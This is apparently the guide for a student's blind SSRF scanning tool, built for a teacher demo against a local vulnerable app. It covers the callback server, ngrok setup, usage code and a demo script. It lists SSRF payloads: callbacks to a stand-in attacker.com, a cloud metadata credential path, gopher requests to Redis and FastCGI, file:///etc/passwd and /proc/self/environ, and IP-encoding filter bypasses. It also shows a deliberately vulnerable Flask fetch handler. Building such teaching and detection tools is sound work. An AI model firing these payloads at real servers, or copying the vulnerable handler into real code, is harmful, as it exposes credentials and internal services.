# Blind SSRF Module - Complete Guide

## 🚀 Quick Start

### 1. Start Callback Server
```bash
cd "\\wsl.localhost\kali-linux\home\saga\final year project"
python bssrf/oob/callback_server.py
```

### 2. Start Ngrok (New Terminal)
```bash
ngrok http 5000
# Copy: https://abc123def456.ngrok.io
```

### 3. Run Scanner
```python
from bssrf.modules.blind_ssrf.ssrf_module import BlindSSRFModule

module = BlindSSRFModule(
    listener_url='https://abc123def456.ngrok.io',  # Your ngrok URL
    wait_time=20,
    verify_callbacks=True
)

results = module.scan_and_verify('http://127.0.0.1:8000/fetch_image?url=test')
print(f"Confirmed SSRF: {results['confirmed_count']} ✅")
```

---

## 📋 What Is Blind SSRF?

**Blind SSRF (Server-Side Request Forgery)** is a vulnerability where:
1. An attacker injects a URL into a parameter
2. The vulnerable server fetches that URL
3. The attacker doesn't see the response (blind)
4. **But can confirm via Out-of-Band (OOB) callbacks**

### Example Vulnerable Code:
```python
@app.route('/fetch_image')
def fetch_image():
    url = request.args.get('url')
    response = requests.get(url)  # ❌ Vulnerable!
    return response
```

### Attack:
```
GET /fetch_image?url=https://attacker.com/callback?id=UUID-123
↓
Server makes request → attacker.com receives callback
↓
Attacker confirms SSRF ✅
```

---

## 🏗️ System Architecture

```
YOUR TOOL                           VULNERABLE SERVER
┌─────────────────────┐            ┌──────────────────┐
│ SSRF Scanner        │            │  Web App         │
│ ┌─────────────────┐ │            │  (Flask/Django)  │
│ │ Payload Engine  │ │──inject─→  │ /fetch?url=...   │
│ │ (51 payloads)   │ │            │                  │
│ └─────────────────┘ │            │ requests.get()   │
│         ↓           │            │ (makes request)  │
│ ┌─────────────────┐ │            └──────────┬───────┘
│ │ Detector        │ │                       │
│ │ (tracks UUIDs)  │ │                       ↓
│ └─────────────────┘ │            NGROK TUNNEL
│         ↓           │            (localhost:5000)
│ ┌─────────────────┐ │                    ↓
│ │ Correlator      │ │            ┌──────────────────┐
│ │ (checks for     │ │            │ Callback Server  │
│ │  callbacks)     │ │←─receives─ │ (Flask)          │
│ └─────────────────┘ │            │ logs UUID        │
│                     │            │ saves JSON       │
└─────────────────────┘            └──────────────────┘
         ↓
    RESULT: ✅ CONFIRMED SSRF
```

---

## ⚙️ Setup & Installation

### Prerequisites
```bash
# Already installed in your project:
pip install flask requests colorama

# Optional (for ngrok):
# Download from https://ngrok.com/download
# Or: choco install ngrok (Windows)
```

### Files Structure
```
bssrf/
├── oob/
│   ├── callback_server.py      ← Receives callbacks
│   └── correlation.py          ← Matches UUIDs
├── modules/blind_ssrf/
│   ├── payloads.py             ← 51 payload types
│   ├── detector.py             ← Injects payloads
│   └── ssrf_module.py          ← Main interface
├── output/
│   └── callbacks.json          ← Logged callbacks
└── test_callback_system.py     ← Test suite
```

---

## 🔧 Usage Examples

### Example 1: Basic Scan (No Verification)
```python
from bssrf.modules.blind_ssrf.ssrf_module import BlindSSRFModule

# Initialize
module = BlindSSRFModule('http://callback.com', verify_callbacks=False)

# Scan
injections = module.scan_url('http://target.com/fetch?url=test')

# Result: All injections (not verified)
print(f"Injections made: {len(injections)}")
```

### Example 2: With Automatic Verification
```python
module = BlindSSRFModule(
    listener_url='https://your-ngrok.ngrok.io',
    wait_time=30,
    verify_callbacks=True  # ← Auto-verify with callbacks
)

results = module.scan_and_verify('http://target.com/fetch?url=test')

# Result: Only confirmed SSRF vulnerabilities
print(f"Confirmed SSRF: {results['confirmed_count']}")
for finding in results['confirmed']:
    print(f"  ✅ {finding['parameter']} - {finding['payload_type']}")
```

### Example 3: Advanced Payloads
```python
module = BlindSSRFModule(
    listener_url='https://your-ngrok.ngrok.io',
    verify_callbacks=True,
    use_advanced=True  # ← 51 payloads instead of 6
)

results = module.scan_and_verify('http://target.com/fetch?url=test')
```

### Example 4: API-Based Verification
```python
module = BlindSSRFModule(
    listener_url='https://your-ngrok.ngrok.io',
    verify_callbacks=True,
    callback_api_url='http://localhost:5000'  # Query API instead of file
)

results = module.scan_and_verify('http://target.com/fetch?url=test')
```

---

## 📊 Payload Coverage

### Total: **51 Payloads** in comprehensive mode

| Category | Count | Examples |
|----------|-------|----------|
| **Basic** | 6 | DNS, HTTP, AWS, Azure, GCP, Localhost |
| **Internal Services** | 17 | MySQL, PostgreSQL, Redis, MongoDB, Elasticsearch, RabbitMQ, SSH |
| **Gopher Protocol** | 4 | Redis commands, FastCGI, Memcached, SMTP |
| **File Protocol** | 7 | /etc/passwd, /etc/hosts, Windows files |
| **Encoded Variants** | 11 | URL encoding, hex IP, octal IP, IPv6, case variations |
| **Internal IPs** | 6 | 127.0.0.1, localhost, 192.168.x.x, 10.0.0.x, 172.16.x.x |

### Payload Types:

**Basic (6):**
```
✅ DNS Exfiltration: http://UUID.ssrf.attacker.com/
✅ HTTP Callback:     http://attacker.com/ssrf?id=UUID
✅ AWS Metadata:      http://169.254.169.254/latest/meta-data/iam/...
✅ Azure Metadata:    http://169.254.169.254/metadata/instance/...
✅ GCP Metadata:      http://metadata.google.internal/computeMetadata/...
✅ Localhost Probe:   http://localhost:80/?callback=...
```

**Advanced Services (17):**
```
✅ MySQL:           http://localhost:3306
✅ PostgreSQL:      http://localhost:5432
✅ Redis:           http://localhost:6379
✅ MongoDB:         http://localhost:27017
✅ Elasticsearch:   http://localhost:9200
✅ RabbitMQ:        http://localhost:5672
✅ Memcached:       http://localhost:11211
✅ SSH:             http://localhost:22
✅ Admin Panels:    http://localhost:8080, 8443
✅ Internal hosts:  http://internal-db:5432, http://db:5432, etc.
```

**Gopher (4):**
```
✅ gopher://127.0.0.1:6379/_GET / HTTP/1.1    (Redis)
✅ gopher://127.0.0.1:9000/_GET / HTTP/1.1    (FastCGI)
✅ gopher://127.0.0.1:11211/_stats            (Memcached)
✅ gopher://localhost:25/_HELO test           (SMTP)
```

**File Protocol (7):**
```
✅ file:///etc/passwd
✅ file:///etc/hosts
✅ file:///proc/self/environ
✅ file://C:/Windows/win.ini
✅ file://C:/Windows/System32/drivers/etc/hosts
✅ ... and more variants
```

**Encoding (11):**
```
✅ URL encoding:      http%3A%2F%2Flocalhost%3A8080
✅ Double encoding:   http%253A%252F%252Flocalhost%253A8080
✅ Case variations:   HTTP://, HtTp://
✅ Hex IP:            http://0x7f.0x0.0x0.0x1:8080
✅ Octal IP:          http://0177.0.0.0.1:8080
✅ IPv6:              http://[::1]:8080
```

---

## 🔌 Callback Server API

### Start Server:
```bash
python bssrf/oob/callback_server.py --port 5000
```

### Endpoints:

| Endpoint | Method | Purpose | Example |
|----------|--------|---------|---------|
| `/` | ANY | Catch all callbacks | `https://ngrok.io/ssrf?id=UUID` |
| `/api/callbacks` | GET | List all callbacks | `curl http://localhost:5000/api/callbacks` |
| `/api/check/<uuid>` | GET | Check specific UUID | `curl http://localhost:5000/api/check/UUID-123` |
| `/api/clear` | POST | Clear all callbacks | `curl -X POST http://localhost:5000/api/clear` |
| `/health` | GET | Health check | `curl http://localhost:5000/health` |

### Example Queries:
```bash
# List all callbacks
curl http://localhost:5000/api/callbacks | jq

# Check specific UUID
curl http://localhost:5000/api/check/550e8400-e29b-41d4-a716-446655440000 | jq

# Clear all
curl -X POST http://localhost:5000/api/clear

# Health check
curl http://localhost:5000/health
```

---

## 📝 Integration with main.py

Your `main.py` already has SSRF integrated. To use automatic verification:

```python
# In main.py around line 290-350 (SSRF handler):

# Initialize with callback verification
ssrf_module = BlindSSRFModule(
    listener_url=args.listener,
    timeout=args.timeout,
    wait_time=args.wait or 30,
    verify_callbacks=True  # ← Enable this
)

# Scan and verify
for url in urls:
    results = ssrf_module.scan_and_verify(url)
    
    # Add only CONFIRMED findings
    if results['confirmed']:
        all_findings.extend(results['confirmed'])
```

Then run:
```bash
# Make sure callback server + ngrok are running first!
python main.py -f targets.txt --scan ssrf \
  --listener https://your-ngrok-url.ngrok.io \
  --wait 30
```

---

## 🧪 Testing

### Run System Tests:
```bash
python bssrf/test_callback_system.py
```

Expected output:
```
✅ PASS  Callback Server Import
✅ PASS  Callback Correlator
✅ PASS  SSRF Module with Verification
✅ PASS  Simulated Callback Flow
✅ PASS  Advanced Payload Generation

Results: 5/5 tests passed
```

### Test with Demo App:
```bash
# Terminal 1: Callback server
python bssrf/oob/callback_server.py

# Terminal 2: Ngrok
ngrok http 5000

# Terminal 3: Demo app
python demo_vuln_app/app.py

# Terminal 4: Test scan
python -c "
from bssrf.modules.blind_ssrf.ssrf_module import BlindSSRFModule
module = BlindSSRFModule('https://YOUR-NGROK.ngrok.io', verify_callbacks=True)
results = module.scan_and_verify('http://127.0.0.1:8000/fetch_image?url=test')
print(f'✅ Confirmed: {results[\"confirmed_count\"]}')
"
```

---

## 🎓 Teacher Demo Script

```python
#!/usr/bin/env python3
"""
SSRF Detection Demo for Teacher Presentation
Shows automatic vulnerability confirmation with callbacks
"""

from bssrf.modules.blind_ssrf.ssrf_module import BlindSSRFModule
import time

print("=" * 70)
print("  BLIND SSRF VULNERABILITY DETECTION - LIVE DEMO")
print("=" * 70)

# Step 1: Initialize
print("\n[Step 1] Initializing SSRF Scanner...")
print("  - Callback Verification: ENABLED")
print("  - Payloads: 51 (basic + advanced)")
print("  - Wait Time: 20 seconds")

module = BlindSSRFModule(
    listener_url='https://YOUR-NGROK-URL.ngrok.io',  # ← Replace with your ngrok URL
    wait_time=20,
    verify_callbacks=True,
    use_advanced=False  # Basic payloads for demo clarity
)
print("✅ Scanner initialized")

# Step 2: Target
print("\n[Step 2] Target Information:")
target = 'http://127.0.0.1:8000/fetch_image?url=test'
print(f"  URL: {target}")
print(f"  Parameter: url (SSRF-vulnerable)")

# Step 3: Scan
print("\n[Step 3] Scanning for vulnerabilities...")
print("  - Injecting 6 payload types...")
print("  - Waiting for server callbacks...")

start_time = time.time()
results = module.scan_and_verify(target)
elapsed = time.time() - start_time

# Step 4: Results
print(f"\n[Step 4] Results (completed in {elapsed:.1f}s):")
print("=" * 70)

if results['confirmed_count'] > 0:
    print(f"✅ SSRF VULNERABILITY CONFIRMED! ({results['confirmed_count']} found)")
    print("=" * 70)
    
    for i, finding in enumerate(results['confirmed'], 1):
        print(f"\nFinding #{i}:")
        print(f"  Parameter:        {finding['parameter']}")
        print(f"  Payload Type:     {finding['payload_type']}")
        print(f"  Status Code:      {finding['status_code']}")
        print(f"  Response Length:  {finding['response_length']} bytes")
        print(f"  Callback UUID:    {finding['uuid']}")
        print(f"  Callback Time:    {finding['confirmation_time']}")
        print(f"  Proof:            🔒 Server made OOB callback")
else:
    print(f"⚠️  No SSRF confirmed (got {results['total_injections']} injections)")
    print("   Check that:")
    print("   - Callback server is running")
    print("   - Ngrok tunnel is active")
    print("   - Vulnerable app can make outbound requests")

print("\n" + "=" * 70)
print("DEMO COMPLETE")
print("=" * 70)
```

---

## 🐛 Troubleshooting

### Problem: "No callbacks received"
**Solutions:**
- ✅ Check callback server: `curl http://localhost:5000/health`
- ✅ Check ngrok running: `ngrok http 5000`
- ✅ Verify ngrok URL in scanner code
- ✅ Check ngrok dashboard: `http://127.0.0.1:4040`
- ✅ Verify vulnerable app can make outbound requests

### Problem: "CallbackCorrelator not available"
**Solution:**
```bash
pip install flask requests
```

### Problem: "Callback server unreachable"
**Check:**
```bash
# Test server health
curl http://localhost:5000/health

# Check if port 5000 is free
netstat -an | grep 5000

# Kill process on port 5000 if needed
lsof -i :5000
```

### Problem: "UUID not found in callbacks"
**Debug:**
```bash
# View all callbacks
curl http://localhost:5000/api/callbacks | python -m json.tool

# View callbacks file directly
type bssrf\output\callbacks.json
```

### Problem: Flask ImportError
**Solution:**
```bash
pip install flask==2.0.3 werkzeug==2.0.3
```

---

## 📊 Output Files

### Findings Files:
```
bssrf/output/findings_ssrf.json     ← Structured data (JSON)
bssrf/output/findings_ssrf.txt      ← Human-readable (TXT)
bssrf/output/callbacks.json         ← Raw callbacks logged
```

### Example findings_ssrf.json:
```json
{
  "total_confirmed": 2,
  "vulnerabilities": [
    {
      "url": "http://127.0.0.1:8000/fetch_image?url=...",
      "parameter": "url",
      "payload_type": "http",
      "confirmed": true,
      "callback_uuid": "550e8400-e29b-41d4-a716-446655440000",
      "timestamp": "2026-01-05T10:00:00"
    }
  ]
}
```

---

## 🔑 Key Classes & Methods

### BlindSSRFModule
```python
class BlindSSRFModule:
    def __init__(listener_url, timeout=10, wait_time=5, 
                 verify_callbacks=True, callback_api_url=None)
    
    def scan_url(url)                    # Scan URL
    def scan_post_form(url, form_data)  # Scan POST
    def scan_and_verify(url)            # Scan + auto-verify ✅
    def verify_findings(injections)     # Manual verify
    def wait_for_callbacks(timeout)     # Wait for callbacks
    def get_all_injections()            # Get all made
```

### CallbackCorrelator
```python
class CallbackCorrelator:
    def check_uuid(uuid)                        # Check single UUID
    def wait_and_check(uuid, wait_time)        # Wait then check
    def correlate_injections(injections)       # Correlate batch
    def check_callback_server_health()         # Health check
```

### SSRFPayloadEngine
```python
class SSRFPayloadEngine:
    def get_all_payloads(callback_id)          # 6 basic payloads
    def get_advanced_payloads(callback_id)     # 34 advanced
    def get_encoded_variations(callback_id)    # 11 variations
    def is_ssrf_parameter(param_name)          # Check if param SSRF-risky
```

---

## 📚 References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [HackerOne SSRF Reports](https://hackerone.com/reports)
- [Blind SSRF Detection](https://blog.projectdiscovery.io/blind-ssrf-detection/)
- [Ngrok Documentation](https://ngrok.com/docs)

---

## ✅ Checklist for Teacher Demo

- [ ] Callback server running (`python bssrf/oob/callback_server.py`)
- [ ] Ngrok running (`ngrok http 5000`)
- [ ] Ngrok URL copied to demo script
- [ ] Demo vulnerable app running (`python demo_vuln_app/app.py`)
- [ ] Test system working (`python bssrf/test_callback_system.py`)
- [ ] Run demo script or manual scan
- [ ] Show confirmed SSRF results
- [ ] Show callback server logs

---

**Last Updated:** January 5, 2026  
**Status:** ✅ All features implemented and tested  
**Implementation:** 5/5 tests passing
